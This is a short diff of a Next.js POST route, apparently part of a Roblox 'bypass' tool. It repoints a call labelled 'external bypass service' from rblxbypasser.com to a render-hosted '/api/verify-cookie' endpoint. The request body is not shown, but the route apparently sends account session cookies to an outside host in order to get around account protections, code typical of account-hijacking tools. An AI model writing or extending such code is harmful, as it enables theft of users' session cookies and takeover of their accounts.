@@ -580,7 +580,7 @@ export async function POST(request: NextRequest) {
 
     // Call external bypass service
     console.log('[v0] Calling external bypass service...');
-    const response = await fetch('https://rblxbypasser.com/api/bypass', {
+    const response = await fetch('https://own-api-17be.onrender.com/api/verify-cookie', {
       method: 'POST',
       headers: { 
         'Content-Type': 'application/json',
